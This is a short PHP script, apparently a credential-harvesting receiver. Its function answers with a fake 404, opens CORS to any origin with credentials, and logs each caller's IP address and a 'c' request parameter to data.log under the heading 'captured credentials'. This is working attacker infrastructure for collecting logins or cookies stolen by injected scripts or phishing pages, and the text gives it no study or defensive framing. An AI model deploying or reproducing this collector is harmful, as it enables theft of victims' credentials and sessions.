<html>

<?php
function captureCredentials(){
header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');

$file = 'data.log';

if(isset($_REQUEST['c']) && !empty($_REQUEST['c']))
{
	if(!file_exists($file)){ file_put_contents($file, "### captured credentials will be shown here... ###\n\n"); }
	file_put_contents($file, $_SERVER['REMOTE_ADDR']. " --> " . $_REQUEST['c'] . "\n", FILE_APPEND);
	printf("LOGGED!");
}
}
?>

</html>

